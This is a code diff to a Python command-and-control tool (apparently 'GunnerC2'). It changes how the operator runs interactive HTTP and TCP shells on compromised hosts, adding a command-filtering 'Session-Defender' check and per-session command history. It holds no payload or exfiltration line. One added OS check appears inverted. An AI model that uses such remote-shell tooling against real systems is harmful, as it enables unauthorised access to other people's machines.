@@ -1,6 +1,8 @@
 import base64, socket
-from core import session_manager
-from core.sessions import SessionManager
+from core import utils
+from core.session_handlers import session_manager, sessions
+from core.utils import defender
+from core.session_handlers.sessions import SessionManager
 import queue
 import subprocess, os, sys
 from tqdm import tqdm
@@ -10,6 +12,8 @@ import zipfile
 import time
 import shutil
 import tempfile
+import readline
+from main import HISTORY_FILE
 
 from colorama import init, Fore, Style
 brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
@@ -31,6 +35,16 @@ def run_command_http(sid, cmd):
     session = session_manager.sessions[sid]
     display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
     meta = session.metadata
+    os_type = meta.get("os", "").lower()
+
+    defender_state = defender.is_active
+
+    # === Session-Defender check ===
+    if defender_state:
+        if os_type in ("windows", "linux"):
+            if not defender.inspect_command(os_type, cmd):
+                print(brightred + "[!] Command blocked by Session-Defender.")
+                return None
 
     b64_cmd = base64.b64encode(cmd.encode()).decode()
 
@@ -54,19 +68,28 @@ def run_command_http(sid, cmd):
 
 def run_command_tcp(sid, cmd):
     session = session_manager.sessions[sid]
+    meta = session.metadata
     display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
     client_socket = session.handler
+    os_type = meta.get("os", "").lower()
+
+    defender_state = defender.is_active
+
+    # === Session-Defender check ===
+    if defender_state:
+        if os_type in ("windows", "linux"):
+            if not defender.inspect_command(os_type, cmd):
+                print(brightred + "[!] Command blocked by Session-Defender.")
+                return None
 
     try:
         try:
-            print(cmd)
-            print(cmd.encode())
             client_socket.sendall(cmd.encode() + b"\n")
 
         except Exception as e:
             print(brightred + f"[-] ERROR failed to send command over socket: {e}")
             
-        client_socket.settimeout(10.0)
+        client_socket.settimeout(0.5)
         response = b''
 
         while True:
@@ -97,14 +120,29 @@ def run_command_tcp(sid, cmd):
 
 def interactive_http_shell(sid):
     session = session_manager.sessions[sid]
+    trans = session.transport
+    transport = trans.upper()
     display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
     meta = session.metadata
+    os_type = meta.get("os", "").lower()
+    defender_state = defender.is_active
+
+    session_hist = os.path.join(tempfile.gettempdir(), f"gunnerc2_http_{sid}.hist")
+    readline.write_history_file(HISTORY_FILE)
+    readline.clear_history()
+    try:
+        readline.read_history_file(session_hist)
+    except FileNotFoundError:
+        pass
+
+    if os_type in ("windows", "linux"):
+        print(brightred + f"[!] ERROR unsupported operating system on compromised host {display}")
 
     orig_stp = signal.getsignal(signal.SIGTSTP)
     signal.signal(signal.SIGTSTP, lambda s, f: (_ for _ in ()).throw(EOFError))
 
     try:
-        print(brightgreen + f"[*] Interactive HTTP shell with {display}. Type 'exit' to return.")
+        print(brightgreen + f"[*] Interactive {transport} shell with {display}. Type 'exit' to return.")
 
         while True:
             try:
@@ -112,9 +150,9 @@ def interactive_http_shell(sid):
 
             except EOFError:
                     # Ctrl-Z pressed
-                    ans = input(brightgreen + "\nBackground this HTTP shell? [y/N]: ").strip().lower()
+                    ans = input(brightgreen + f"\nBackground this {transport} shell? [y/N]: ").strip().lower()
                     if ans in ("y", "yes"):
-                        print(brightyellow + f"[*] Backgrounded HTTP shell {display}")
+                        print(brightyellow + f"[*] Backgrounded {transport} shell {display}")
                         break
                     else:
                         continue
@@ -124,16 +162,22 @@ def interactive_http_shell(sid):
                 print(brightyellow + "\n(Press Ctrl-Z to background, or type 'exit' to quit)")
                 continue
 
+            # === Session-Defender check ===
+            if defender_state:
+                if not defender.inspect_command(os_type, cmd):
+                    print(brightred + "[!] Command blocked by Session-Defender.")
+                    continue
+
             if cmd.lower() in ("exit", "quit"):
                 if session_manager.kill_http_session(sid):
-                    print(brightyellow + f"[*] Killed HTTP session {display}")
+                    print(brightyellow + f"[*] Killed {transport} session {display}")
                 else:
                     print(brightred + f"[!] No such session {display}")
                     
                 break
 
             if cmd.strip().lower() in ("bg", "background", "back"):
-                print(brightyellow + f"[*] Backgrounded HTTP session {display}")
+                print(brightyellow + f"[*] Backgrounded {transport} session {display}")
                 break
 
             if not cmd:
@@ -156,16 +200,36 @@ def interactive_http_shell(sid):
             print(out.rstrip())
 
     finally:
+        readline.write_history_file(session_hist)
+        readline.clear_history()
+        try:
+            readline.read_history_file(HISTORY_FILE)
+        except FileNotFoundError:
+            pass
         signal.signal(signal.SIGTSTP, orig_stp)
 
 def interactive_tcp_shell(sid):
+    session = session_manager.sessions[sid]
+    trans = session.transport
+    transport = trans.upper()
     display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
     client_socket = session_manager.sessions[sid].handler
+    meta = session.metadata
+    os_type = meta.get("os", "").lower()
+    defender_state = defender.is_active
+
+    session_hist = os.path.join(tempfile.gettempdir(), f"gunnerc2_tcp_{sid}.hist")
+    readline.write_history_file(HISTORY_FILE)
+    readline.clear_history()
+    try:
+        readline.read_history_file(session_hist)
+    except FileNotFoundError:
+        pass
 
     orig_stp = signal.getsignal(signal.SIGTSTP)
     signal.signal(signal.SIGTSTP, lambda s, f: (_ for _ in ()).throw(EOFError))
 
-    print(brightgreen + f"[*] Interactive TCP shell with {display}. Type 'exit' to close.")
+    print(brightgreen + f"[*] Interactive {transport} shell with {display}. Type 'exit' to close.")
 
     try:
         while True:
@@ -176,7 +240,7 @@ def interactive_tcp_shell(sid):
                 # Ctrl-Z caught here
                 ans = input(brightgreen + "\nBackground this shell? [y/N]: ").strip().lower()
                 if ans in ("y", "yes"):
-                    print(brightyellow + f"[*] Backgrounded TCP session {display}")
+                    print(brightyellow + f"[*] Backgrounded {transport} session {display}")
                     break
                 else:
                     # redrawing prompt
@@ -187,14 +251,24 @@ def interactive_tcp_shell(sid):
                 print(brightyellow + "\n(Press Ctrl-Z to background, or type 'exit' to close)")
                 continue
 
+            # === Session-Defender check ===
+            try:
+                if defender_state:
+                    if not defender.inspect_command(os_type, cmd):
+                        print(brightred + "[!] Command blocked by Session-Defender.")
+                        continue
+
+            except Exception as e:
+                print(brightred + f"[!] Error happened in session defender")
+
             if cmd.strip().lower() in ("exit", "quit"):
                 client_socket.close()
                 del session_manager.sessions[sid]
-                print(brightyellow + f"[*] Closed TCP session {display}")
+                print(brightyellow + f"[*] Closed {transport} session {display}")
                 break
 
             if cmd.strip().lower() in ("bg", "background", "back"):
-                print(brightyellow + f"[*] Backgrounded TCP session {display}")
+                print(brightyellow + f"[*] Backgrounded {transport} session {display}")
                 break
 
             if not cmd.strip():
@@ -227,6 +301,15 @@ def interactive_tcp_shell(sid):
         del session_manager.sessions[sid]
 
     finally:
+        readline.write_history_file(session_hist)
+        readline.clear_history()
+
+        try:
+            readline.read_history_file(HISTORY_FILE)
+
+        except FileNotFoundError:
+            pass
+
         signal.signal(signal.SIGTSTP, orig_stp)
 
 ### 🧨 File download logic:
